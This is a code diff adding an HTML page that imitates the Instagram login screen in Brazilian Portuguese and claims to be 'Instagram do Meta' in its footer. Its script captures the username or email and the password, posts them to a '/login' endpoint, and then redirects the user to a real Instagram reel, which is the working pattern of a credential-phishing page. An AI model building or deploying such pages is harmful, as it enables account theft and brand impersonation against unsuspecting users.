@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <main class="main-container">
+    <div class="login-container">
+      <!-- LOGO -->
+      <img src="logo.png" alt="Logo" class="logo-img" />
+
+      <!-- FORMULÁRIO -->
+      <form class="login-box" id="loginForm">
+        <input
+          type="text"
+          id="email"
+          placeholder="Telefone, nome de usuário ou e-mail"
+          required
+        />
+        <input type="password" id="senha" placeholder="Senha" required />
+        <button type="submit" class="login-button">Entrar</button>
+
+        <div class="divider-box">
+          <div class="line"></div>
+          <div class="or">OU</div>
+          <div class="line"></div>
+        </div>
+
+        <a href="#" class="facebook-login">Entrar com Facebook</a>
+        <a href="#" class="forgot">Esqueceu a senha?</a>
+      </form>
+
+      <div class="signup-box">
+        <p>
+          Não tem uma conta?
+          <a href="#">Cadastre-se</a>
+        </p>
+      </div>
+
+      <div class="get-app">
+        <p>Obtenha o aplicativo.</p>
+        <div class="store-buttons">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg"
+            alt="Google Play"
+            style="height: 40px"
+          />
+          <img
+            src="https://developer.apple.com/assets/elements/badges/download-on-the-app-store.svg"
+            alt="App Store"
+            style="height: 40px"
+          />
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-links">
+      <a href="#">Meta</a>
+      <a href="#">Sobre</a>
+      <a href="#">Blog</a>
+      <a href="#">Ajuda</a>
+      <a href="#">Privacidade</a>
+      <a href="#">Termos</a>
+    </div>
+    <p class="language">Português (Brasil)</p>
+    <p class="copyright">© 2025 Instagram do Meta</p>
+  </footer>
+
+  <!-- SCRIPT FINAL COM REDIRECIONAMENTO -->
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const senha = document.getElementById("senha").value;
+
+      try {
+        const response = await fetch("/login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ email, senha }),
+        });
+
+        if (response.ok) {
+          // ✅ Redirecionar para o vídeo do Instagram
+          window.location.href = "https://www.instagram.com/reel/DJUlfcKMsz0/?igsh=cTZhYm5iMnd2NDNu";
+        } else {
+          console.error("Erro ao enviar os dados.");
+        }
+      } catch (error) {
+        console.error("Erro de conexão com o servidor:", error);
+      }
+
+      // Limpar os campos (opcional)
+      document.getElementById("email").value = "";
+      document.getElementById("senha").value = "";
+    });
+  </script>
+</body>
+</html>
